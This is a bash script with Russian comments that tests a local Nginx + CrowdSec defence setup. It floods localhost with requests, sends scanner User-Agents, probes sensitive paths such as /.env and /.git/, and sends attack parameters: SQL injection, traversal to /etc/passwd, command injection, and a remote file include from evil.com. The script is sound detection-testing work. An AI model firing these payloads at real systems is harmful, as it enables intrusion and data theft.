#!/bin/bash

# Скрипт для тестирования системы безопасности Nginx + CrowdSec

echo "🧪 Тестирование системы безопасности Nginx + CrowdSec"
echo "=================================================="

BASE_URL="http://localhost:54104"

# Проверка доступности сервиса
echo "1. Проверка доступности сервиса..."
if curl -s "$BASE_URL" > /dev/null; then
    echo "✅ Nginx доступен"
else
    echo "❌ Nginx недоступен"
    exit 1
fi

sleep 2

# Тест 1: Симуляция DDoS атаки
echo -e "\n2. Симуляция DDoS атаки (100 быстрых запросов)..."
for i in {1..100}; do
    curl -s "$BASE_URL" > /dev/null &
done
wait
echo "✅ DDoS тест завершен"

sleep 5

# Тест 2: Подозрительные User-Agent
echo -e "\n3. Тестирование подозрительных User-Agent..."
suspicious_agents=(
    "sqlmap/1.0"
    "Nikto/2.1.6"
    "w3af.org"
    "Nmap Scripting Engine"
    "ZmEu"
    "masscan/1.0"
)

for agent in "${suspicious_agents[@]}"; do
    echo "   Тестирование: $agent"
    curl -s -H "User-Agent: $agent" "$BASE_URL" > /dev/null
    sleep 1
done
echo "✅ User-Agent тест завершен"

sleep 3

# Тест 3: Сканирование директорий и файлов
echo -e "\n4. Симуляция сканирования директорий..."
scan_paths=(
    "/admin/"
    "/wp-admin/"
    "/phpmyadmin/"
    "/.env"
    "/config.php"
    "/backup.sql"
    "/.git/"
    "/robots.txt"
    "/sitemap.xml"
    "/admin.php"
    "/login.php"
    "/config.bak"
    "/.htaccess"
    "/web.config"
    "/server-status"
)

for path in "${scan_paths[@]}"; do
    echo "   Сканирование: $path"
    curl -s "$BASE_URL$path" > /dev/null
    sleep 0.5
done
echo "✅ Сканирование завершено"

sleep 3

# Тест 4: Множественные 404 ошибки
echo -e "\n5. Генерация множественных 404 ошибок..."
for i in {1..50}; do
    curl -s "$BASE_URL/nonexistent-$i.php" > /dev/null
done
echo "✅ 404 тест завершен"

sleep 3

# Тест 5: Подозрительные параметры
echo -e "\n6. Тестирование подозрительных параметров..."
malicious_params=(
    "?id=1' OR '1'='1"
    "?file=../../../etc/passwd"
    "?cmd=ls -la"
    "?exec=whoami"
    "?eval=phpinfo()"
    "?include=http://evil.com/shell.txt"
)

for param in "${malicious_params[@]}"; do
    echo "   Тестирование: $param"
    curl -s "$BASE_URL/$param" > /dev/null
    sleep 1
done
echo "✅ Параметры тест завершен"

echo -e "\n🎯 Все тесты завершены!"
echo "=================================================="
echo "Проверьте алерты CrowdSec:"
echo "docker-compose exec crowdsec cscli alerts list"
echo ""
echo "Просмотр метрик:"
echo "docker-compose exec crowdsec cscli metrics"
echo ""
echo "Логи CrowdSec:"
echo "docker-compose logs crowdsec"